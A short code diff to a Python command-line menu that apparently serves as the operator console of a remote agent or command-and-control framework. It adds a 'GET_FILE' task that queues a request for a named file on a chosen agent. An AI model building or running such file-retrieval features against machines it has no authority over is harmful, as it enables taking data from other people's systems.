@@ -153,7 +153,11 @@ class MainMenu(cmd.Cmd):
             print("Agent not found!")
             return
 
-        # TODO: implement agent file get
+        get_task = {
+            "cmd": "GET_FILE",
+            "file": file,
+        }
+        self.agents[uuid].add_task(json.dumps(get_task))
 
     def do_use(self, cmd):
         try:
